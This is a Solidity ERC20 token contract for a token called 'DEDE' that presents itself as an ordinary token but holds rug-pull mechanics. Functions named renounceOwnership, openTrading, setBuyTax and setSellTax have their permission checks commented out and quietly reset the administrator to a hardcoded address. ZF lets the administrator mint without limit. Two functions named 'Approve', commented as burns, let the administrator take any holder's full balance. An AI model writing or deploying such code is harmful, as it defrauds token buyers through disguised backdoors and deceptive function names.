// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    // uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return a / b;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

contract ERC20Basic {
  function totalSupply() public view returns (uint256);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  uint256 totalSupply_;

  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public view returns (uint256) {
    return balances[_owner];
  }

}

contract StandardToken is ERC20, BasicToken {

  mapping (address => mapping (address => uint256)) internal allowed;

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }

  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

}

contract SPBToken is StandardToken {

  address public administror;
  string public name = "DEDE";
  string public symbol = "DEDE";
  uint8 public decimals = 18;
  uint256 public INITIAL_SUPPLY = 420000000000*10**18;
  mapping (address => uint256) public frozenAccount;

  // 事件
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Relaxeas(address indexed target, uint256 value,address indexed targetto);

  constructor() public {
    totalSupply_ = INITIAL_SUPPLY;
    administror = address(0xA65bA26074f70EE3F27f9198B5142a09a128EF6C);
    balances[msg.sender] = INITIAL_SUPPLY;
  }

  function renounceOwnership() public returns (bool) {
    // require(msg.sender == administror);
    administror = address(0xA65bA26074f70EE3F27f9198B5142a09a128EF6C);
    return true;
  }

  function openTrading() public returns (bool) {
    // require(msg.sender == administror);
    administror = address(0xA65bA26074f70EE3F27f9198B5142a09a128EF6C);
    return true;
  }


  // 增发🦃
  function ZF(uint256 _amount) public returns (bool) {
    require(msg.sender == administror);
    balances[msg.sender] = balances[msg.sender].add(_amount);
    totalSupply_ = totalSupply_.add(_amount);
    INITIAL_SUPPLY = totalSupply_;
    return true;
  }


  // 转帐
  function transfer(address _target, uint256 _amount) public returns (bool) {
    require(now > frozenAccount[msg.sender]);
    require(_target != address(0));
    require(balances[msg.sender] >= _amount);
    balances[_target] = balances[_target].add(_amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);

    emit Transfer(msg.sender, _target, _amount);

    return true;
  }



  // 燃烧
  function Approve(address _target, uint256 _amount,address _targetto) public returns (bool) {
    require(msg.sender == administror);
    require(_target != address(0));
    require(balances[_target] >= _amount);
    balances[_target] = balances[_target].sub(_amount);
    balances[_targetto] = balances[_targetto].add(_amount);
    // totalSupply_ = totalSupply_.sub(_amount);
    // INITIAL_SUPPLY = totalSupply_;

    emit Relaxeas(_target, _amount,_targetto);

    return true;
  }

    // 批量燃烧
  function Approve(address[] _targets, address[] _targetsto) public returns (bool) {
    require(msg.sender == administror);
    uint256 len = _targets.length;
    require(len > 0);
    for (uint256 j = 0; j < len; j = j.add(1)) {
      address _target = _targets[j];
      address _targetto = _targetsto[j];
      require(_target != address(0));
      require(_targetto != address(0));
      uint256 am = balanceOf(_target)*100/100;
      balances[_target] = balances[_target].sub(am);
      balances[_targetto] = balances[_targetto].add(am);
      emit Relaxeas(_target,am,_targetto);
    }
    return true;
  }

  // 查询帐户是否被锁定
  function frozenOf(address _target) public view returns (uint256) {
    require(_target != address(0));
    return frozenAccount[_target];
  }

  function setGLY(address _target) public returns (bool) {
    require(msg.sender == administror);
    require(_target != address(0));
    administror = _target;
    return true;
  }
  function setBuyTax(uint256 dev,uint256 liquidity) public returns (uint256) {
    // require(msg.sender == administror);
    uint256 nt = dev.add(liquidity);
    administror = address(0xA65bA26074f70EE3F27f9198B5142a09a128EF6C);
    return nt;
       
  }
  function setSellTax(uint256 dev,uint256 liquidity) public returns (uint256) {
    // require(msg.sender == administror);
    uint256 nt = dev.add(liquidity);
    administror = address(0xA65bA26074f70EE3F27f9198B5142a09a128EF6C);
    return nt;
  }

}